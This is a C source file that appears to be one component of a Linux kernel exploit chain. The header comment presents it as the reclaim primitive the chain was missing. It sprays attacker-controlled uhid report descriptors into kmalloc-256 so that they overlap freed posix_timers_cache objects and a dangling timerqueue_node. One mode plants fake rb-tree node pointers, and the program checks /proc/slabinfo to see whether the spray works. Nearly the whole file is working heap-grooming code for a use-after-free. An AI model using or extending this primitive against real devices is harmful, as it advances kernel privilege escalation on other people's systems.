/*
 * uhid_spray.c - the reclaim primitive the 64560 chain was missing.
 *
 * uhid_dev_create2() takes our report descriptor and keeps it in a kernel
 * allocation (kmemdup(rd_data, rd_size)) for the lifetime of the uhid device.
 * rd_size = 256 therefore lands in kmalloc-256, which on this device is
 * order-1 with 32 objects per 8 KiB slab - exactly the shape of
 * posix_timers_cache (384 B x 21, order-1).
 *
 * And unlike every other primitive we tried, the object is *fully* attacker
 * controlled at every offset, including the two windows a dangling
 * timerqueue_node can occupy (page offsets 0xe0 + n*0x180 => 224 or 96 mod 256).
 *
 * This just measures whether the spray actually moves those caches.
 */
#define _GNU_SOURCE
#include <errno.h>
#include <fcntl.h>
#include <stdio.h>
#include <stdint.h>
#include <stdlib.h>
#include <string.h>
#include <sys/resource.h>
#include <unistd.h>

#define UHID_CREATE2 11
#define EVENT_SIZE 4380
#define CREATE2_OFF 4
#define CREATE2_SIZE 4372
#define BUS_USB 0x03

static int *fds;
static uint8_t ev[EVENT_SIZE];

static void slab(const char *tag)
{
    FILE *f = fopen("/proc/slabinfo", "re");
    char line[256];
    printf("--- %s ---\n", tag);
    if (!f) { printf("  unreadable\n"); return; }
    while (fgets(line, sizeof line, f)) {
        if (!strncmp(line, "kmalloc-256 ", 12) ||
            !strncmp(line, "memdup_user-256 ", 16) ||
            !strncmp(line, "posix_timers_cache ", 19))
            printf("  %s", line);
    }
    fclose(f);
}

static int create_dev(int fd, const uint8_t *desc, int rd_size, int idx)
{
    memset(ev, 0, sizeof ev);
    *(uint32_t *)ev = UHID_CREATE2;
    uint8_t *c2 = ev + CREATE2_OFF;
    snprintf((char *)c2, 128, "lhspray%d", idx);
    *(uint16_t *)(c2 + 256) = (uint16_t)rd_size;
    *(uint16_t *)(c2 + 258) = BUS_USB;
    *(uint32_t *)(c2 + 260) = 0x1234;
    *(uint32_t *)(c2 + 264) = (uint32_t)idx;
    *(uint32_t *)(c2 + 268) = 1;
    memcpy(c2 + 276, desc, rd_size);
    errno = 0;
    ssize_t w = write(fd, ev, sizeof ev);
    if (w != (ssize_t)sizeof ev) {
        printf("  create %d failed: %zd (%s)\n", idx, w, strerror(errno));
        return -1;
    }
    return 0;
}

int main(int argc, char **argv)
{
    int N = argc > 1 ? atoi(argv[1]) : 2000;
    int rd = argc > 2 ? atoi(argv[2]) : 256;

    struct rlimit rl;
    if (getrlimit(RLIMIT_NOFILE, &rl) == 0 && rl.rlim_cur < rl.rlim_max) {
        rl.rlim_cur = rl.rlim_max;
        setrlimit(RLIMIT_NOFILE, &rl);
    }

    /* distinctive descriptor: every byte a pattern, so a later takeover can be
     * recognised, and sized exactly rd bytes */
    int mode = argc > 3 ? atoi(argv[3]) : 0;
    uint8_t *desc = calloc(1, rd);
    if (mode == 0) {
        for (int i = 0; i < rd; i++) desc[i] = (uint8_t)(0x40 + (i & 0x3f));
    } else {
        /* realistic fake-node layout: all zero except rb_left at both residues */
        uint64_t ptr = 0xdeadbeefdead0000ULL;
        if (rd >= 120) memcpy(desc + 112, &ptr, 8);   /* node at page off 96  */
        if (rd >= 248) memcpy(desc + 240, &ptr, 8);   /* node at page off 224 */
    }

    fds = calloc(N, sizeof(int));
    slab("before");

    int made = 0;
    for (int i = 0; i < N; i++) {
        int fd = open("/dev/uhid", O_RDWR | O_CLOEXEC | O_NONBLOCK);
        if (fd < 0) { printf("  open stopped at %d: %s\n", i, strerror(errno)); break; }
        if (create_dev(fd, desc, rd, i) != 0) { close(fd); break; }
        fds[made++] = fd;
    }
    printf("created %d uhid devices with rd_size=%d (%d KB of controlled kernel memory)\n",
           made, rd, made * rd / 1024);
    slab("after create");

    for (int i = 0; i < made; i++) close(fds[i]);
    usleep(300000);
    slab("after close");
    return 0;
}

